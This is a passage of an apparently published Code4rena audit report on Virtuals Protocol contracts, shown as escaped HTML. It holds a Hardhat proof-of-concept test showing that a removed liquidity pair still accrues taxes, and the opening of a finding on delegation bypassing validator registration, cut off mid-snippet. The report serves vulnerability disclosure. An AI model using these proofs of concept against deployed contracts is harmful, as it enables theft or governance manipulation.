virtualToken.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        agentNft.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        PROPOSAL_THRESHOLD,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        deployer.address,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      ]\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentFactory.waitForDeployment();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`AgentFactoryV2 deployed at ${agentFactory.target}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentNft.grantRole(await agentNft.MINTER_ROLE(), agentFactory.target);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Granted MINTER_ROLE to AgentFactory\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying Minter...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const minter = await upgrades.deployProxy(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      await ethers.getContractFactory(\u0026quot;Minter\u0026quot;),\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      [\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        service.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        contribution.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        agentNft.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        1e12,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        20,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        ipVault.address,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        agentFactory.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        deployer.address,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        1e10,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      ]\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await minter.waitForDeployment();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`Minter deployed at ${minter.target}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Setting parameters on AgentFactory...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentFactory.setMaturityDuration(86400 * 365 * 10); // 10years\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentFactory.setUniswapRouter(process.env.UNISWAP_ROUTER);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentFactory.setTokenAdmin(deployer.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentFactory.setTokenSupplyParams(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.AGENT_TOKEN_LIMIT,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.AGENT_TOKEN_LP_SUPPLY,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.AGENT_TOKEN_VAULT_SUPPLY,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.AGENT_TOKEN_LIMIT,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.AGENT_TOKEN_LIMIT,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.BOT_PROTECTION,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      minter.target\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentFactory.setTokenTaxParams(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.TAX,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.TAX,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.SWAP_THRESHOLD,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      treasury.address\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;AgentFactory parameters set\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    return { virtualToken, agentFactory, agentNft, minter, tbaRegistry };\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  async function deployWithApplication() {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const base = await deployBaseContracts();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { agentFactory, virtualToken, tbaRegistry } = base;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { founder } = await getAccounts();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Prepare tokens for proposal\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Minting VirtualToken for founder...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await virtualToken.mint(founder.address, PROPOSAL_THRESHOLD);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await virtualToken\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .connect(founder)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .approve(agentFactory.target, PROPOSAL_THRESHOLD);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003econsole.log(\u0026quot;Proposing agent...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const tx = await agentFactory\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .connect(founder)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .proposeAgent(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        genesisInput.name,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        genesisInput.symbol,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        genesisInput.tokenURI,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        genesisInput.cores,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        genesisInput.tbaSalt,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        tbaRegistry.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        genesisInput.daoVotingPeriod,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        genesisInput.daoThreshold\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      await tx.wait();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const filter = agentFactory.filters.NewApplication;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const events = await agentFactory.queryFilter(filter, -1);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const event = events[0];\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { id } = event.args;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`Agent application created with ID: ${id}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    return { applicationId: id, ...base };\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  async function deployWithAgent() {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const base = await deployWithApplication();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { agentFactory, applicationId } = base;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { founder } = await getAccounts();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Executing application...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentFactory\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .connect(founder)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .executeApplication(applicationId, false);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const factoryFilter = agentFactory.filters.NewPersona;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const factoryEvents = await agentFactory.queryFilter(factoryFilter, -1);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const factoryEvent = factoryEvents[0];\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { virtualId, token, veToken, dao, tba, lp } = await factoryEvent.args;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`Agent created with virtualId: ${virtualId}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    return {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      ...base,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      agent: {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        virtualId,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        token,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        veToken,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        dao,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        tba,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        lp,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      },\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    };\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  before(async function () {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Increase timeout for all tests\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    this.timeout(60000);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  });\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eit(\u0026quot;Removed liquidity pair still accrues taxes\u0026quot;, async function () {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { agent, agentNft, virtualToken} = await loadFixture(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      deployWithAgent\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { trader, poorMan, founder, randomAddr, deployer } = await getAccounts();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const router = await ethers.getContractAt(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u0026quot;IUniswapV2Router02\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.UNISWAP_ROUTER\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const agentToken = await ethers.getContractAt(\u0026quot;AgentToken\u0026quot;, agent.token);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const uniswapV2Pair = await agentToken.uniswapV2Pair();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;uniswapV2Pair: \u0026quot;, uniswapV2Pair);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentToken.connect(deployer).removeLiquidityPool(uniswapV2Pair);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Should still assert isLiquidityPool as true\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(await agentToken.isLiquidityPool(uniswapV2Pair)).to.be.eq(true);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  });\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e});\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003c/details\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-14-votesupgradeabledelegate-bypasses-the-addvalidator-call-leads-to-a-non-validator-holding-voting-power-along-with-loss-of-rewards\" style=\"position:relative;\"\u003e\u003ca href=\"#m-14-votesupgradeabledelegate-bypasses-the-addvalidator-call-leads-to-a-non-validator-holding-voting-power-along-with-loss-of-rewards\" aria-label=\"m 14 votesupgradeabledelegate bypasses the addvalidator call leads to a non validator holding voting power along with loss of rewards permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-52\"\u003e[M-14] \u003ccode\u003eVotesUpgradeable::delegate\u003c/code\u003e bypasses the \u003ccode\u003eaddValidator\u003c/code\u003e call, leads to a non-validator holding voting power along with loss of rewards\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-557\"\u003eYouCrossTheLineAlfie\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentVeToken.sol#L13\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentVeToken.sol#L13\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-8\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-8\" aria-label=\"finding description 8 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentVeToken.sol#L59\"\u003e\u003ccode\u003eAgentVeToken::stake\u003c/code\u003e\u003c/a\u003e allows users to stake their tokens in exchange of the power to delegate voting power to a delegatee.\nThis delegatee can now take part in the governance process via \u003ccode\u003eAgentDAO\u003c/code\u003e contract.\u003c/p\u003e\n\u003cp\u003eThese delegates are rewarded via \u003ccode\u003eAgentReward\u003c/code\u003e contract, this is performed via storing the validators during stake.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"81\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003estake\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceiver\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edelegatee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// . . . Rest of the code . . .\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etotalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() == \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            